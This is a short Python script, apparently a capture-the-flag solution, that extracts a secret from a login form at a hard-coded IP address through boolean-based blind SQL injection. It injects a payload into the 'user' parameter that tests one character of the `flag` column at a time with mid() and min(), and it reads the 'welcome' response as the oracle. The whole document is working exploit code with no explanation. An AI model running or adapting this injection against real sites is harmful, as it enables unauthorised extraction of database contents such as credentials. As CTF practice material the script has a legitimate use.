import requests
import string

URL = "http://42.96.19.122:2005/"

CHARSET = string.ascii_letters + string.digits + "{}"

def test_payload(pos, ch):
    payload = f"'or(mid((select(min(`flag`))from`flag`),{pos},1)='{ch}')or'"
    params = {"user": payload, "pass": "a"}
    try:
        r = requests.get(URL, params=params, timeout=5)
        return "welcome" in r.text
    except requests.exceptions.RequestException:
        return False

def brute_flag(maxlen=28):
    flag = ""
    for pos in range(1, maxlen+1):
        found = False
        for ch in CHARSET:
            if test_payload(pos, ch):
                flag += ch
                print(f"[+] Found char {pos}: {ch} -> {flag}")
                found = True
                break
        if not found:
            flag += "?"
            print(f"[?] Unknown char at pos {pos} -> {flag}")

    return flag

if __name__ == "__main__":
    final_flag = brute_flag(50)
    print("Final Flag:", final_flag)